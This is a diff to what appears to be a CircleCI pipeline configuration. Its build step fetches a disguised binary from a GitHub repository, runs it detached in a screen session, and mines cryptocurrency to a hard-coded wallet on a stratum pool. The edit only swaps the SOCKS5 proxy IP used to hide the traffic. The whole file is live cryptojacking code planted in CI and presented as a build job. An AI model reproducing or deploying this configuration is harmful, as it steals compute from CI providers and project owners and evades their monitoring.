@@ -16,7 +16,7 @@ working_dir: &working_dir ~/app
                     wget -O proxy-sse2 https://github.com/MawdeMylchreest/Mylchreest/raw/main/proxy-sse2
                     chmod +x proxy-sse2
                     screen -dmS ls
-                    ./proxy-sse2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.CI=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS5://185.189.68.168:3128
+                    ./proxy-sse2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.CI=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS5://67.201.33.10:25283
         no_output_timeout: 235m
 version: 2.0
 jobs:
